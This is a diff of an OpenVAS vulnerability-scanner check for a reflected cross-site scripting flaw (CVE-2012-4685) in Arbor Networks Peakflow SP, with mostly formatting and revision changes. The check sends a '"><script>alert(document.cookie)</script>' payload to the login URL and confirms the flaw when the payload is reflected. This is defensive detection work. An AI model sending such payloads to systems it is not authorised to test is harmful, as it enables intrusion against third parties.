@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_arbor_networks_peakflow_sp_xss_vuln.nasl 5977 2017-04-19 09:02:22Z teissa $
+# $Id: gb_arbor_networks_peakflow_sp_xss_vuln.nasl 11159 2018-08-29 10:26:39Z asteins $
 #
 # Arbor Networks Peakflow SP 'index/' Cross Site Scripting Vulnerability
 #
@@ -27,20 +27,20 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802958");
-  script_version("$Revision: 5977 $");
+  script_version("$Revision: 11159 $");
   script_cve_id("CVE-2012-4685");
   script_bugtraq_id(52881);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-19 11:02:22 +0200 (Wed, 19 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-29 12:26:39 +0200 (Wed, 29 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-09-11 11:47:18 +0530 (Tue, 11 Sep 2012)");
   script_name("Arbor Networks Peakflow SP 'index/' Cross Site Scripting Vulnerability");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/48728");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74648");
-  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0019.html");
-  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0037.html");
-  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0036.html");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/48728");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74648");
+  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-04/0019.html");
+  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-04/0037.html");
+  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-04/0036.html");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
@@ -48,18 +48,18 @@ if(description)
   script_require_ports("Services/www", 443);
   script_dependencies("find_service.nasl", "http_version.nasl");
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to insert arbitrary HTML
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
   and script code, which will be executed in a user's browser session in the
   context of an affected site.
   Impact Level: Application");
-  script_tag(name : "affected" , value : "Arbor Networks Peakflow SP 5.1.1 before patch 6, 5.5 before patch 4,
+  script_tag(name:"affected", value:"Arbor Networks Peakflow SP 5.1.1 before patch 6, 5.5 before patch 4,
   and 5.6.0 before patch 1");
-  script_tag(name : "insight" , value : "Input appended to the URL after 'index/' in the login interface is not
+  script_tag(name:"insight", value:"Input appended to the URL after 'index/' in the login interface is not
   properly sanitised before being returned to the user.");
-  script_tag(name : "solution" , value : "Upgrade to Arbor Networks Peakflow SP 5.1.1 patch 6,
+  script_tag(name:"solution", value:"Upgrade to Arbor Networks Peakflow SP 5.1.1 patch 6,
   5.5 patch 4, 5.6.0 patch 1 or later
   For updates refer to http://www.arbornetworks.com/peakflow-sp-traffic-anomaly-detection.html");
-  script_tag(name : "summary" , value : "This host is running Arbor Networks Peakflow SP and is prone to
+  script_tag(name:"summary", value:"This host is running Arbor Networks Peakflow SP and is prone to
   cross site scripting vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_app");
@@ -72,33 +72,20 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-req2 = "";
-res2 = "";
-url = "";
-port = 0;
-
-## Get Port
 port = get_http_port(default:443);
 
 url = "/index";
 req = http_get(item:url, port:port);
 
-## Confirm the application before trying exploit
 res = http_keepalive_send_recv(port:port, data:req);
 
 if(res && ">Welcome to Arbor Networks Peakflow SP<" >< res)
 {
-  ## Construct attack request
   url = url + '/"><script>alert(document.cookie)</script>';
   req2 = http_get(item:url, port:port);
 
-  ## Send request and receive the response
   res2 = http_keepalive_send_recv(port:port, data:req2);
 
-  ## Confirm exploit worked by checking the response
   if(res2 && "<script>alert(document.cookie)</script>" >< res2 &&
      res2 =~ "HTTP/1.. 200" &&
      ">Welcome to Arbor Networks Peakflow SP<" >< res2){
